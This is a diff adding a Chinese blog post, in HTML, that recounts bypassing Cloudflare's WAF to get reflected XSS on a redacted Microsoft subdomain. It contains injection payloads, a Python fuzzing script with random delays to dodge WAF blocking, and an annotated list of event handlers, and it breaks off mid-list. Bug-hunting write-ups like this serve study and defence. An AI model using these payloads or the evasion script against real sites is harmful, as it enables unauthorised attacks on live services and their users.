@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="记一次艰难的微软某站XSS绕过WAF前言有一天我去微软官方下载镜像，于是乎我发现了这一个网站存在html的回显且双引号逃逸，经过我的一番研究之后，成功绕过了cloudflare的拦截，历经波折，在此写下文章记录一下。 正文开始当我发现这个链接，给s参数进行传参的时候是有回显的，并且我可以使用双引号闭合 1https:&#x2F;&#x2F;xxxxx.microsoft.com&#x2F;?cat&#x3D;asclx&amp;emai">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次艰难的微软某站XSS绕过WAF">
+<meta property="og:url" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="记一次艰难的微软某站XSS绕过WAF前言有一天我去微软官方下载镜像，于是乎我发现了这一个网站存在html的回显且双引号逃逸，经过我的一番研究之后，成功绕过了cloudflare的拦截，历经波折，在此写下文章记录一下。 正文开始当我发现这个链接，给s参数进行传参的时候是有回显的，并且我可以使用双引号闭合 1https:&#x2F;&#x2F;xxxxx.microsoft.com&#x2F;?cat&#x3D;asclx&amp;emai">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/mKgWYbCsJQHyiWbZw_0NsLOmSYtujozSJ8KFp54uiHo.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/Dpay8XELao4VfTCzEt14bDhsRSDtifhGddPXv9Bw7xI.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/Ws204n4u3Be03wSr1jd5qJoXZQVbjIImB_wm-w-L7qU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/zKMGCKgzM4Cp0g6UMNG2nSEJ3Gs_cgP8lsTtfzCpCao.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/9f7y4VTXltHE5Xu6DwrXyFB2rhH-xn__54UtuUFtPWE.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/Je7xbhQnJAlkaNWQQ60fjS7RiO07AtbBorAUeKBnrQs.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/xn50cB_DFGfJLZszfuoIRqNLvRrtN2VGVolDSythKOU.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/W85CMroMpBVczpyI8MkHlyxkpTqTiQRs0rlwbLJxy0s.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/0W51WPSvn9QFWcwWRbs2metRnFDu-LeWFrDNyFjGDeI.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/7RhNWH0LpIriLtTtjwkCUp3ZTtsNdiZHocH_039CJ5E.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/rrZKoYQ7UbtkWmuw5p2mfV_tPHZnQqhd1-iaINHOuXc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/OVpeOfsNQGF97xSI9Jxyy2QAcOjk8oeDjeR7KHj7N4Y.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/zAtlnEMW3IDw5bVa4OJBAF_iZyO1SpV7OufnoDek4GM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/cyouecdhDaHjhWM3rvlkVdIBQq8p5L65PbsstzphKA8.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/PjKGs03xhChxWt6yOxAixjLN3Ps2QESt-YGEnMP_rQg.png">
+<meta property="article:published_time" content="2023-07-28T13:40:49.000Z">
+<meta property="article:modified_time" content="2023-08-03T10:52:14.707Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="bypass waf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/mKgWYbCsJQHyiWbZw_0NsLOmSYtujozSJ8KFp54uiHo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次艰难的微软某站XSS绕过WAF</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&text=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&is_video=false&description=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次艰难的微软某站XSS绕过WAF&body=Check out this article: https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&title=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&name=记一次艰难的微软某站XSS绕过WAF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF/&t=记一次艰难的微软某站XSS绕过WAF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84%E5%BE%AE%E8%BD%AF%E6%9F%90%E7%AB%99XSS%E7%BB%95%E8%BF%87WAF"><span class="toc-number">1.</span> <span class="toc-text">记一次艰难的微软某站XSS绕过WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E6%96%87%E5%BC%80%E5%A7%8B"><span class="toc-number">1.2.</span> <span class="toc-text">正文开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E2%80%9D-gt-%E2%80%9D%E9%97%AD%E5%90%88"><span class="toc-number">1.3.</span> <span class="toc-text">尝试使用”&gt;”闭合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E2%80%9D-%E2%80%9C%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">尝试”&#96;“绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz%E4%BA%8B%E4%BB%B6%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">fuzz事件函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E5%BC%B9%E7%AA%97%E5%87%BD%E6%95%B0"><span class="toc-number">1.6.</span> <span class="toc-text">尝试绕过弹窗函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E4%BB%8E%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%85%A5%E6%89%8B"><span class="toc-number">1.7.</span> <span class="toc-text">尝试从反引号入手</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95throw"><span class="toc-number">1.8.</span> <span class="toc-text">尝试throw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E6%B7%BB%E5%8A%A0%E9%A2%9D%E5%A4%96%E5%AD%97%E7%AC%A6%E6%89%B0%E4%B9%B1%EF%BC%88%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.9.</span> <span class="toc-text">尝试添加额外字符扰乱（成功）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.10.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        记一次艰难的微软某站XSS绕过WAF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-28T13:40:49.000Z" class="dt-published" itemprop="datePublished">2023-07-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/">实战记录</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>, <a class="p-category" href="/tags/bypass-waf/" rel="tag">bypass waf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="记一次艰难的微软某站XSS绕过WAF"><a href="#记一次艰难的微软某站XSS绕过WAF" class="headerlink" title="记一次艰难的微软某站XSS绕过WAF"></a>记一次艰难的微软某站XSS绕过WAF</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有一天我去微软官方下载镜像，于是乎我发现了这一个网站存在html的回显且双引号逃逸，经过我的一番研究之后，成功绕过了cloudflare的拦截，历经波折，在此写下文章记录一下。</p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>当我发现这个链接，给s参数进行传参的时候是有回显的，并且我可以使用双引号闭合</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?cat=asclx&amp;email=rvdty&amp;lang=clvwc&amp;p=s2sb8&amp;query=ky1m1&amp;s=%22hellohaha&amp;type=zcyzt&amp;unsubscribe_token=i79hx&amp;url=tewx9</span></span><br></pre></td></tr></table></figure>
+<p><img src="mKgWYbCsJQHyiWbZw_0NsLOmSYtujozSJ8KFp54uiHo.png" alt="image"></p>
+<h2 id="尝试使用”-gt-”闭合"><a href="#尝试使用”-gt-”闭合" class="headerlink" title="尝试使用”&gt;”闭合"></a>尝试使用”&gt;”闭合</h2><p>再尝试使用&gt;进行闭合标签，以失败告终，被过滤了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=&quot;&gt;ONclick=alert`1</span></span><br></pre></td></tr></table></figure>
+<p><img src="Dpay8XELao4VfTCzEt14bDhsRSDtifhGddPXv9Bw7xI.png" alt="image"></p>
+<p>尝试使用编码绕过；能够正常显示，但还是没闭合标签</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=%22%26%23%78%30%30%30%30%33%65ONclick=alert%601</span></span><br></pre></td></tr></table></figure>
+<p><img src="Ws204n4u3Be03wSr1jd5qJoXZQVbjIImB_wm-w-L7qU.png" alt="image"></p>
+<p>只能考虑使用h1标签插入事件来触发XSS了；直接输入完整的payload，发现被拦截了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?cat=asclx&amp;email=rvdty&amp;lang=clvwc&amp;p=s2sb8&amp;query=ky1m1&amp;s=%22ONclick=alert(1)&amp;type=zcyzt&amp;unsubscribe_token=i79hx&amp;url=tewx9</span></span><br></pre></td></tr></table></figure>
+<p><img src="zKMGCKgzM4Cp0g6UMNG2nSEJ3Gs_cgP8lsTtfzCpCao.png" alt="image"></p>
+<p>我把多余的传参删掉，继续测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclick=alert1</span></span><br></pre></td></tr></table></figure>
+<p><img src="9f7y4VTXltHE5Xu6DwrXyFB2rhH-xn__54UtuUFtPWE.png" alt="image"></p>
+<h2 id="尝试”-“绕过"><a href="#尝试”-“绕过" class="headerlink" title="尝试”`“绕过"></a>尝试”`“绕过</h2><p>圆括号被拦截，换成`</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没拦截   https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclick=alert`1</span></span><br><span class="line">拦截    https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclick=alert`1`</span></span><br><span class="line">没拦截  https:<span class="comment">//xxxxx.microsoft.com/?s=%22ONclic=alert`1`</span></span><br></pre></td></tr></table></figure>
+<p>综合上述的那个payload发现，其实如果没有出现鼠标或者其它事件的触发函数的话，是可以正常使用反引号的，于是乎我开始fuzz能够触发的函数</p>
+<p>用python写了一个脚本进行fuzz，事件的话使用网上搜索到的。为什么我不直接使用burp的lntruder来枚举呢？因为延迟不好设置，避免容易被waf拦截，我使用python可以实现了随机延迟来进行fuzz</p>
+<p>python脚本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"># 读取参数文件</span><br><span class="line">with <span class="title function_">open</span><span class="params">(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span> as file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"># 循环发送请求</span><br><span class="line"><span class="keyword">for</span> line in lines:</span><br><span class="line">    parameter = line.strip()  # 去除换行符和空格</span><br><span class="line">    url = f<span class="string">&quot;https://xxxx.microsoft.com/?s=%22&#123;parameter&#125;=confirm%602%60%20&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>  # 替换为你自己的User-Agent字符串</span><br><span class="line">    &#125;</span><br><span class="line">    # 发送GET请求</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    # 打印响应状态码</span><br><span class="line">    print(f<span class="string">&quot;请求URL: &#123;url&#125;&quot;</span>)</span><br><span class="line">    print(f<span class="string">&quot;响应状态码: &#123;response.status_code&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    # 延迟x秒</span><br><span class="line">    delay = random.uniform(<span class="number">3</span>, <span class="number">9</span>)</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="fuzz事件函数"><a href="#fuzz事件函数" class="headerlink" title="fuzz事件函数"></a>fuzz事件函数</h2><p>事件函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"> FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)</span><br><span class="line"> onAbort() (当用户中止加载图片时)</span><br><span class="line"> onActivate() (当对象激活时)</span><br><span class="line"> onAfterPrint() (用户打印或进行打印预览后触发)</span><br><span class="line"> onAfterUpdate() (从数据源对象更新数据后由数据对象触发)</span><br><span class="line"> onBeforeActivate() (在对象设置为激活元素前触发)</span><br><span class="line"> onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(<span class="string">&quot;Copy&quot;</span>)函数触发)</span><br><span class="line"> onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)</span><br><span class="line"> onBeforeDeactivate() (在当前对象的激活元素变化前触发)</span><br><span class="line">onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)</span><br><span class="line">onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(<span class="string">&quot;Paste&quot;</span>)函数触发)</span><br><span class="line">onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)</span><br><span class="line">onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)</span><br><span class="line">onBegin() (当元素周期开始时由onbegin 事件立即触发)</span><br><span class="line">onBlur() (另一个窗口弹出当前窗口失去焦点时触发)</span><br><span class="line">onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)</span><br><span class="line">onCellChange() 